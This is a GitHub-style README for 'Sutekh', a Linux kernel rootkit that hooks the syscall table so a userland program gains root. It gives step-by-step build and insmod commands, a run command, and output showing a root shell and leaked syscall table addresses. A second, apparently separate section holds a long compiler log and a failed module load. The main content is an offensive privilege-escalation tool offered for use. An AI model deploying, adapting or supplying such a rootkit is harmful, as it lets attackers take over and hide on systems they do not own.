# Sutekh
An example rootkit that gives a userland process root permissions
Tested on Linux kernel [4.19.62] & [4.15.0]

[INSTALL]
1. Install latest Linux headers for your kernel. Example (debian): [apt install linux-headers-$(uname -r)]
2. $ git clone https://github.com/PinkP4nther/Sutekh
3. $ cd Sutekh && make
4. $ gcc rootswitch.c -o rs
5. $ sudo insmod sutekh.ko

[Run]
$ ./rs

[Output example]
[pinky@mememachine Sutekh]$ ./rs
[!] Switch hit!
[mememachine Sutekh]# id
uid=0(root) gid=0(root) groups=0(root)
[mememachine Sutekh]# exit

[Remove]
sudo rmmod sutekh

[Note]
dmesg for kernel debug output!

[ 2217.810776] [?] SCT: [0xffffffff96400180]
               [?] EXECVE: [0xffffffffc065b030]
               [?] UMASK: [0xffffffffc065b000]
[ 2223.379218] [+] Giving r00t!


####################################################################
# dear friend :D
-------------------------------
kerneldev:/opt/Sutekh # make
make -C /lib/modules/5.3.6_nu11secur1ty-lp151.28.20-default/build M=/opt/Sutekh modules
make[1]: Entering directory '/usr/src/kernels/5.3.6_nu11secur1ty-lp151.28.20-default'
  CC [M]  /opt/Sutekh/sutekh.o
/opt/Sutekh/sutekh.c: In function ‘mal_execve’:
/opt/Sutekh/sutekh.c:39:3: warning: ISO C90 forbids mixed declarations and code [-Wdeclaration-after-statement]
   struct cred *np;
   ^~~~~~
In file included from ./include/linux/printk.h:7:0,
                 from ./include/linux/kernel.h:15,
                 from ./include/asm-generic/bug.h:18,
                 from ./arch/x86/include/asm/bug.h:83,
                 from ./include/linux/bug.h:5,
                 from ./include/linux/mmdebug.h:5,
                 from ./include/linux/mm.h:9,
                 from ./include/asm-generic/cacheflush.h:6,
                 from ./arch/x86/include/asm/cacheflush.h:6,
                 from /opt/Sutekh/sutekh.c:4:
/opt/Sutekh/sutekh.c: In function ‘hload’:
./include/linux/kern_levels.h:5:18: warning: format ‘%llx’ expects argument of type ‘long long unsigned int’, but argument 2 has type ‘void **’ [-Wformat=]
 #define KERN_SOH "\001"  /* ASCII Start Of Header */
                  ^
./include/linux/kern_levels.h:14:19: note: in expansion of macro ‘KERN_SOH’
 #define KERN_INFO KERN_SOH "6" /* informational */
                   ^~~~~~~~
/opt/Sutekh/sutekh.c:119:9: note: in expansion of macro ‘KERN_INFO’
  printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
         ^~~~~~~~~
/opt/Sutekh/sutekh.c:119:35: note: format string is defined here
  printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
                                ~~~^
In file included from ./include/linux/printk.h:7:0,
                 from ./include/linux/kernel.h:15,
                 from ./include/asm-generic/bug.h:18,
                 from ./arch/x86/include/asm/bug.h:83,
                 from ./include/linux/bug.h:5,
                 from ./include/linux/mmdebug.h:5,
                 from ./include/linux/mm.h:9,
                 from ./include/asm-generic/cacheflush.h:6,
                 from ./arch/x86/include/asm/cacheflush.h:6,
                 from /opt/Sutekh/sutekh.c:4:
./include/linux/kern_levels.h:5:18: warning: format ‘%llx’ expects argument of type ‘long long unsigned int’, but argument 3 has type ‘void *’ [-Wformat=]
 #define KERN_SOH "\001"  /* ASCII Start Of Header */
                  ^
./include/linux/kern_levels.h:14:19: note: in expansion of macro ‘KERN_SOH’
 #define KERN_INFO KERN_SOH "6" /* informational */
                   ^~~~~~~~
/opt/Sutekh/sutekh.c:119:9: note: in expansion of macro ‘KERN_INFO’
  printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
         ^~~~~~~~~
/opt/Sutekh/sutekh.c:119:57: note: format string is defined here
  printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
                                                      ~~~^
                                                      %p
In file included from ./include/linux/printk.h:7:0,
                 from ./include/linux/kernel.h:15,
                 from ./include/asm-generic/bug.h:18,
                 from ./arch/x86/include/asm/bug.h:83,
                 from ./include/linux/bug.h:5,
                 from ./include/linux/mmdebug.h:5,
                 from ./include/linux/mm.h:9,
                 from ./include/asm-generic/cacheflush.h:6,
                 from ./arch/x86/include/asm/cacheflush.h:6,
                 from /opt/Sutekh/sutekh.c:4:
./include/linux/kern_levels.h:5:18: warning: format ‘%llx’ expects argument of type ‘long long unsigned int’, but argument 4 has type ‘void *’ [-Wformat=]
 #define KERN_SOH "\001"  /* ASCII Start Of Header */
                  ^
./include/linux/kern_levels.h:14:19: note: in expansion of macro ‘KERN_SOH’
 #define KERN_INFO KERN_SOH "6" /* informational */
                   ^~~~~~~~
/opt/Sutekh/sutekh.c:119:9: note: in expansion of macro ‘KERN_INFO’
  printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
         ^~~~~~~~~
/opt/Sutekh/sutekh.c:119:78: note: format string is defined here
  printk(KERN_INFO "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",sct_address,sct_address[__NR_execve],sct_address[__NR_umask]);
                                                                           ~~~^
                                                                           %p
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /opt/Sutekh/sutekh.mod.o
  LD [M]  /opt/Sutekh/sutekh.ko
make[1]: Leaving directory '/usr/src/kernels/5.3.6_nu11secur1ty-lp151.28.20-default'
kerneldev:/opt/Sutekh # ls
.git  .sutekh.ko.cmd  .sutekh.mod.cmd  .sutekh.mod.o.cmd  .sutekh.o.cmd  Makefile  Module.symvers  README.TXT  modules.order  rootswitch.c  sutekh.c  sutekh.ko  sutekh.mod  sutekh.mod.c  sutekh.mod.o  sutekh.o
kerneldev:/opt/Sutekh # insmod sutekh.ko 
insmod: ERROR: could not insert module sutekh.ko: Operation not permitted
